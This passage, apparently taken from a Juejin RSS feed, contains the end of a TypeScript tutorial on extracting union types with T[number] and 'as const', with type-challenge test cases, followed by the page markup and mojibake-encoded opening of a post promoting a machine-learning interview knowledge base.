  [P <span class="hljs-keyword">in</span> <span class="hljs-title class_">TodoKeys</span>]: <span class="hljs-title class_">Todo</span>[P]
}
<span class="hljs-comment">// TodoPreview ç±»å‹ä¸ºï¼š</span>
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   title: string</span>
<span class="hljs-comment">//   completed: boolean</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-9"><code>T[number]</code></h4>
<p><code>T[number]</code> ç´¢å¼•è®¿é—®ç±»å‹ ç”¨äº ä»æ•°ç»„ç±»å‹ / å…ƒç»„ç±»å‹ä¸­æå–æ‰€æœ‰å…ƒç´ çš„ç±»å‹ï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªè”åˆç±»å‹ã€‚</p>
<ol>
<li>æ™®é€šæ•°ç»„ç±»å‹</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰æ™®é€šæ•°ç»„ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StringArr</span> = <span class="hljs-built_in">string</span>[];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumberArr</span> = <span class="hljs-built_in">number</span>[];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">BoolArr</span> = <span class="hljs-built_in">boolean</span>[];

<span class="hljs-comment">// T[number] æå–å…ƒç´ ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Str</span> = <span class="hljs-title class_">StringArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼šstring</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Num</span> = <span class="hljs-title class_">NumberArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼šnumber</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Bool</span> = <span class="hljs-title class_">BoolArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼šboolean</span>

<span class="hljs-comment">// ç­‰ä»·äºç›´æ¥æ³¨è§£ç±»å‹</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">s</span>: <span class="hljs-title class_">Str</span> = <span class="hljs-string">"hello"</span>; <span class="hljs-comment">// ç­‰åŒäº let s: string</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">n</span>: <span class="hljs-title class_">Num</span> = <span class="hljs-number">123</span>;    <span class="hljs-comment">// ç­‰åŒäº let n: number</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">b</span>: <span class="hljs-title class_">Bool</span> = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// ç­‰åŒäº let b: boolean</span>
</code></pre>
<ol start="2">
<li>å…ƒç»„ç±»å‹</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå¤šç±»å‹çš„å…ƒç»„ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Tuple</span> = [<span class="hljs-number">123</span>, <span class="hljs-string">"TS"</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">null</span>];

<span class="hljs-comment">// T[number] æå–æ‰€æœ‰å…ƒç´ çš„è”åˆç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleUnion</span> = <span class="hljs-title class_">Tuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼š123 | "TS" | true | null</span>

<span class="hljs-comment">// å˜é‡æ³¨è§£ï¼šå¯ä»¥æ˜¯è”åˆç±»å‹ä¸­çš„ä»»æ„ä¸€ç§</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">val</span>: <span class="hljs-title class_">TupleUnion</span>;
val = <span class="hljs-number">123</span>;    <span class="hljs-comment">// åˆæ³•</span>
val = <span class="hljs-string">"TS"</span>;   <span class="hljs-comment">// åˆæ³•</span>
val = <span class="hljs-literal">true</span>;   <span class="hljs-comment">// åˆæ³•</span>
val = <span class="hljs-literal">null</span>;   <span class="hljs-comment">// åˆæ³•</span>
val = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šä¸åœ¨è”åˆç±»å‹ä¸­</span>
</code></pre>
<ol start="3">
<li>å­—é¢é‡å…ƒç»„</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å­—é¢é‡å…ƒç»„ï¼šå…ƒç´ æ˜¯æ•°å­—/å­—ç¬¦ä¸²å­—é¢é‡</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StatusTuple</span> = [<span class="hljs-number">200</span>, <span class="hljs-number">404</span>, <span class="hljs-number">500</span>];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">EnvTuple</span> = [<span class="hljs-string">"dev"</span>, <span class="hljs-string">"test"</span>, <span class="hljs-string">"prod"</span>];

<span class="hljs-comment">// è½¬å­—é¢é‡è”åˆç±»å‹ï¼ˆå¼€å‘ä¸­å¸¸ç”¨çš„æšä¸¾å¼ç±»å‹ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Status</span> = <span class="hljs-title class_">StatusTuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼š200 | 404 | 500</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Env</span> = <span class="hljs-title class_">EnvTuple</span>[<span class="hljs-built_in">number</span>];       <span class="hljs-comment">// ç»“æœï¼š"dev" | "test" | "prod"</span>

<span class="hljs-comment">// ä¸¥æ ¼é™åˆ¶å˜é‡å€¼ï¼Œé¿å…æ‰‹å†™é”™è¯¯</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">code</span>: <span class="hljs-title class_">Status</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// åˆæ³•</span>
code = <span class="hljs-number">404</span>;             <span class="hljs-comment">// åˆæ³•</span>
code = <span class="hljs-number">403</span>;             <span class="hljs-comment">// âŒ æŠ¥é”™ï¼š403 ä¸åœ¨ 200|404|500 ä¸­</span>

<span class="hljs-keyword">let</span> <span class="hljs-attr">env</span>: <span class="hljs-title class_">Env</span> = <span class="hljs-string">"dev"</span>;   <span class="hljs-comment">// åˆæ³•</span>
env = <span class="hljs-string">"prod"</span>;           <span class="hljs-comment">// åˆæ³•</span>
env = <span class="hljs-string">"production"</span>;     <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šä¸åœ¨è”åˆç±»å‹ä¸­</span>
</code></pre>
<ol start="4">
<li><code>as const</code> + æ•°ç»„ + <code>T[number]</code></li>
</ol>
<p>åŒæ—¶æ‹¥æœ‰æ•°ç»„çš„å¯éå†æ€§ + è”åˆç±»å‹çš„ä¸¥æ ¼ç±»å‹çº¦æŸã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æ­¥éª¤1ï¼šç”¨ as const æ–­è¨€æ•°ç»„ä¸ºã€Œåªè¯»å­—é¢é‡å…ƒç»„ã€</span>
<span class="hljs-comment">// ä½œç”¨ï¼šè®© TS ä¿ç•™æ¯ä¸ªå…ƒç´ çš„å­—é¢é‡ç±»å‹ï¼Œä¸”æŠŠæ•°ç»„è½¬ä¸ºåªè¯»å…ƒç»„ï¼ˆä¸å¯ä¿®æ”¹ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">EnvArr</span> = [<span class="hljs-string">"dev"</span>, <span class="hljs-string">"test"</span>, <span class="hljs-string">"prod"</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;
<span class="hljs-keyword">const</span> <span class="hljs-title class_">StatusArr</span> = [<span class="hljs-number">200</span>, <span class="hljs-number">404</span>, <span class="hljs-number">500</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;

<span class="hljs-comment">// æ­¥éª¤2ï¼šç”¨ typeof è·å–æ•°ç»„çš„ç±»å‹ï¼ˆåªè¯»å­—é¢é‡å…ƒç»„ç±»å‹ï¼‰</span>
<span class="hljs-comment">// è¡¥å……ï¼štypeof æ˜¯ TS å…³é”®å­—ï¼Œç”¨äºã€Œä»å˜é‡ä¸­æå–å…¶ç±»å‹ã€</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">EnvTuple</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">EnvArr</span>; <span class="hljs-comment">// ç±»å‹ï¼šreadonly ["dev", "test", "prod"]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StatusTuple</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">StatusArr</span>; <span class="hljs-comment">// ç±»å‹ï¼šreadonly [200, 404, 500]</span>

<span class="hljs-comment">// æ­¥éª¤3ï¼šç”¨ T[number] è½¬æˆå­—é¢é‡è”åˆç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Env</span> = <span class="hljs-title class_">EnvTuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼š"dev" | "test" | "prod"</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Status</span> = <span class="hljs-title class_">StatusTuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼š200 | 404 | 500</span>

<span class="hljs-comment">// ç®€åŒ–å†™æ³•ï¼ˆå¼€å‘ä¸­å¸¸ç”¨ï¼Œçœç•¥ä¸­é—´å…ƒç»„ç±»å‹ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">EnvSimplify</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">EnvArr</span>[<span class="hljs-built_in">number</span>];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StatusSimplify</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">StatusArr</span>[<span class="hljs-built_in">number</span>];
</code></pre>
<ol start="5">
<li>æ³›å‹ä¸­ä½¿ç”¨ <code>T[number]</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æ³›å‹ T çº¦æŸä¸ºã€Œåªè¯»æ•°ç»„ã€ï¼ˆå…¼å®¹ as const æ–­è¨€çš„æ•°ç»„ï¼‰</span>
<span class="hljs-keyword">function</span> getUnionType&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">any</span>[]&gt;(<span class="hljs-attr">arr</span>: T): T[<span class="hljs-built_in">number</span>] {
  <span class="hljs-keyword">return</span> arr[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * arr.<span class="hljs-property">length</span>)];
}

<span class="hljs-comment">// ä¼ å…¥ as const æ–­è¨€çš„æ•°ç»„ï¼Œè¿”å›å€¼è‡ªåŠ¨æ¨å¯¼ä¸ºå­—é¢é‡è”åˆç±»å‹</span>
<span class="hljs-keyword">const</span> res1 = <span class="hljs-title function_">getUnionType</span>([<span class="hljs-string">"dev"</span>, <span class="hljs-string">"test"</span>, <span class="hljs-string">"prod"</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>); <span class="hljs-comment">// res1 ç±»å‹ï¼š"dev" | "test" | "prod"</span>
<span class="hljs-keyword">const</span> res2 = <span class="hljs-title function_">getUnionType</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>); <span class="hljs-comment">// res2 ç±»å‹ï¼š1 | 2 | 3</span>

<span class="hljs-comment">// ä¼ å…¥æ™®é€šæ•°ç»„ï¼Œè¿”å›å€¼æ¨å¯¼ä¸ºåŸºç¡€ç±»å‹</span>
<span class="hljs-keyword">const</span> res3 = <span class="hljs-title function_">getUnionType</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// res3 ç±»å‹ï¼šnumber</span>
</code></pre>
<ol start="6">
<li>æ”¯æŒåµŒå¥—æ•°ç»„ / å…ƒç»„</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title class_">NestedArr</span> = [[<span class="hljs-number">1</span>, <span class="hljs-string">"a"</span>], [<span class="hljs-number">2</span>, <span class="hljs-string">"b"</span>]] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NestedUnion</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">NestedArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼šreadonly [1, "a"] | readonly [2, "b"]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">DeepUnion</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">NestedArr</span>[<span class="hljs-built_in">number</span>][<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼š1 | "a" | 2 | "b"</span>
</code></pre>
<h3 data-id="heading-10">æµ‹è¯•ç”¨ä¾‹</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ æµ‹è¯•ç”¨ä¾‹ _____________ */</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Equal</span>, <span class="hljs-title class_">Expect</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@type-challenges/utils'</span>

<span class="hljs-keyword">const</span> tuple = [<span class="hljs-string">'tesla'</span>, <span class="hljs-string">'model 3'</span>, <span class="hljs-string">'model X'</span>, <span class="hljs-string">'model Y'</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
<span class="hljs-keyword">const</span> tupleNumber = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
<span class="hljs-keyword">const</span> sym1 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-number">1</span>)
<span class="hljs-keyword">const</span> sym2 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-number">2</span>)
<span class="hljs-keyword">const</span> tupleSymbol = [sym1, sym2] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
<span class="hljs-keyword">const</span> tupleMix = [<span class="hljs-number">1</span>, <span class="hljs-string">'2'</span>, <span class="hljs-number">3</span>, <span class="hljs-string">'4'</span>, sym1] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>

<span class="hljs-keyword">type</span> cases = [
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tuple&gt;, { <span class="hljs-string">'tesla'</span>: <span class="hljs-string">'tesla'</span>, <span class="hljs-string">'model 3'</span>: <span class="hljs-string">'model 3'</span>, <span class="hljs-string">'model X'</span>: <span class="hljs-string">'model X'</span>, <span class="hljs-string">'model Y'</span>: <span class="hljs-string">'model Y'</span> }&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tupleNumber&gt;, { <span class="hljs-number">1</span>: <span class="hljs-number">1</span>, <span class="hljs-number">2</span>: <span class="hljs-number">2</span>, <span class="hljs-number">3</span>: <span class="hljs-number">3</span>, <span class="hljs-number">4</span>: <span class="hljs-number">4</span> }&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tupleSymbol&gt;, { [sym1]: <span class="hljs-keyword">typeof</span> sym1, [sym2]: <span class="hljs-keyword">typeof</span> sym2 }&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tupleMix&gt;, { <span class="hljs-number">1</span>: <span class="hljs-number">1</span>, <span class="hljs-string">'2'</span>: <span class="hljs-string">'2'</span>, <span class="hljs-number">3</span>: <span class="hljs-number">3</span>, <span class="hljs-string">'4'</span>: <span class="hljs-string">'4'</span>, [sym1]: <span class="hljs-keyword">typeof</span> sym1 }&gt;&gt;,
]

<span class="hljs-comment">// @ts-expect-error</span>
<span class="hljs-keyword">type</span> error = <span class="hljs-title class_">TupleToObject</span>&lt;[[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], {}]&gt;

</code></pre>
<h3 data-id="heading-11">ç›¸å…³é“¾æ¥</h3>
<blockquote>
<p>åˆ†äº«ä½ çš„è§£ç­”ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F11%2Fanswer%2Fzh-CN" target="_blank" title="https://tsch.js.org/11/answer/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/11/answer/zâ€¦</a>
æŸ¥çœ‹è§£ç­”ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F11%2Fsolutions" target="_blank" title="https://tsch.js.org/11/solutions" ref="nofollow noopener noreferrer">tsch.js.org/11/solutionâ€¦</a>
æ›´å¤šé¢˜ç›®ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2Fzh-CN" target="_blank" title="https://tsch.js.org/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/zh-CN</a></p>
</blockquote>
<p>ä¸‹é¢æ˜¯æˆ‘çš„å…¬ä¼—å·ï¼Œæ¬¢è¿å…³æ³¨ã€‚å…³æ³¨åæœ‰æ–°çš„åŠŸèƒ½ç‚¹ä¼šåŠæ—¶æ”¶åˆ°æ¨é€ã€‚</p>
<blockquote>
<p>å®æˆ˜ä¸ºç‹ï¼ä¸“æ³¨äºæ±‡æ€»å„ç§åŠŸèƒ½ç‚¹ï¼Œè‡´åŠ›äºæ‰“é€ ä¸€ç³»åˆ—èƒ½å¤Ÿå¸®åŠ©å·¥ç¨‹å¸ˆå®ç°å„ç§åŠŸèƒ½çš„æƒ³æ³•æ€è·¯çš„ä¼˜è´¨æ–‡ç« ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bdeec99a0154e7aa73c1c6765f3dcf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZnhzcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770391205&amp;x-signature=BePhgA1vquk1pj8MgVekhcJIeOM%3D" alt="å‰ç«¯åŠŸèƒ½ç‚¹" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æœºå™¨å­¦ä¹ å…«è‚¡è¶…å…¨å†…å®¹ï¼ï¼ï¼]]></title>    <link>https://juejin.cn/post/7600787795478331438</link>    <guid>https://juejin.cn/post/7600787795478331438</guid>    <pubDate>2026-01-30T15:44:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795478331438" data-draft-id="7600787795478315054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æœºå™¨å­¦ä¹ å…«è‚¡è¶…å…¨å†…å®¹ï¼ï¼ï¼"/> <meta itemprop="keywords" content="é¢è¯•,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-30T15:44:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aicoting"/> <meta itemprop="url" content="https://juejin.cn/user/933911964427818"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æœºå™¨å­¦ä¹ å…«è‚¡è¶…å…¨å†…å®¹ï¼ï¼ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933911964427818/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aicoting
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:44:56.000Z" title="Fri Jan 30 2026 15:44:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æ¨èç›´æ¥ç½‘ç«™åœ¨çº¿é˜…è¯»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Faicoting.cn%2F" target="_blank" title="https://aicoting.cn/" ref="nofollow noopener noreferrer">aicoting |AIç®—æ³•é¢è¯•å­¦ä¹ </a></p>
</blockquote>
<p>å‰é¢æˆ‘ä»¬ä»‹ç»äº†æœºå™¨å­¦ä¹ ä¸­çš„æ‰€æœ‰çŸ¥è¯†ç‚¹ï¼Œä»æœ€å¼€å§‹ç¡®å®šæœºå™¨å­¦ä¹ çŸ¥è¯†åº“çŸ¥è¯†ä½“ç³»æ¡†æ¶ï¼Œåˆ°ç¼–å†™å†…å®¹ï¼Œå†åˆ°æœ€åçš„æ’ç‰ˆï¼Œå‰å‰ååä¸‰ä¸ªæœˆçš„æ—¶é—´ï¼Œç»ˆäºæœºå™¨å­¦ä¹ çŸ¥è¯†åº“å’Œå¤§å®¶è§é¢ï¼ŒçŸ¥è¯†åº“ä¸­ä»æœºå™¨å­¦ä¹ çš„å®šä¹‰ï¼Œåˆ°æ•°å­¦ä¸ç†è®ºåŸºç¡€ï¼Œå†åˆ°æ•°æ®ä¸ç‰¹å¾å·¥ç¨‹ï¼Œå†åˆ°ç›‘ç£å­¦ä¹ æ–¹æ³•ã€æ— ç›‘ç£å­¦ä¹ æ–¹æ³•ã€åŠç›‘ç£å­¦ä¹ æ–¹æ³•ã€å¼ºåŒ–å­¦ä¹ ï¼Œæœ€åå†åˆ°æ¨¡å‹è¯„ä¼°ï¼Œæˆ‘å°½é‡æ¶µç›–äº†æœºå™¨å­¦ä¹ æ‰€æœ‰çš„ç»å…¸å†…å®¹ã€‚</p>
<p>å¹¶ä¸”ä¸ºäº†å¸®åŠ©å¤§å®¶æ›´å¥½çš„ç†è§£ï¼Œå…¶ä¸­ç»å¤§éƒ¨åˆ†çŸ¥è¯†ç‚¹éƒ½ç¼–å†™äº†ç¤ºä¾‹ä»£ç ï¼Œå¤§å®¶å¯ä»¥ç»“åˆè¿›è¡Œå­¦ä¹ ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/129446fbff6f4f42aa7215373840ef43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770392695&amp;x-signature=wHx7wWI1fZE%2FCghUr%2FyJ96FMRxY%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec80d5629b24dcbb75ea318469259e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770392695&amp;x-signature=9DjiPh%2BTgBj5uSRGypHG%2B0zNffc%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
